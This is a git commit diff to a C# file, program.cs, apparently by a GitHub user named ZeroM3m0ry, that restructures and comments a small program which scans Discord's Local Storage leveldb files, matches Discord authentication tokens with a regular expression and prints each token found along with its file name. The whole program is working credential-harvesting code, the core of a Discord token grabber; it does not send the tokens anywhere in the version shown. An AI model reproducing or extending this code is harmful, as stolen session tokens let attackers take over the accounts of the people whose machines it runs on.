ca91cbf9343cb27755f63e5b406f8f7664fc9014
anas <60795188+ZeroM3m0ry@users.noreply.github.com>
2021-05-16 20:37:07 +0100

    Update program.cs

--- program.cs
+++ program.cs
@@ -7,26 +7,32 @@ class ZeroMemory
 {
     public static void Main()
     {
-        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+ @"\discord\Local Storage\leveldb";
-        
-        string[] dbfiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);
-        if (!Directory.Exists(path))
+
+        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+ @"\discord\Local Storage\leveldb";// discord path
+        Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"); //regex for token 
+
+        string[] dbfiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);//enumerate all ldb files in leveldb folder
+
+        if (Directory.Exists(path)) //check if directory exist
         {
-            Console.WriteLine("Discord path not found");
+            foreach (var file in dbfiles)//loop in each file
+            {
+                FileInfo info = new FileInfo(file);
+                string contents = File.ReadAllText(info.FullName);//get all file content
+                Match match = regex.Match(contents);//check if match with regex
+                if (match.Success)
+                {
+                    Console.WriteLine("Token Found in :" + Path.GetFileName(file) + "\n" + match.Value);//print the token and filename where it found
+                }
+            }
+        }
+        else
+        {
+            Console.WriteLine("Discord path not found !");
             System.Environment.Exit(1);
         }
-        Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
-        foreach (var file in dbfiles)
-        {
-            FileInfo info = new FileInfo(file);
-            string contents = File.ReadAllText(info.FullName);
-            Match match = regex.Match(contents);
-            if (match.Success)
-            {
-                Console.WriteLine("Token Found in :" + Path.GetFileName(file) + "\n" + match.Value);
-            }
+        
 
-        }
 
     }
 
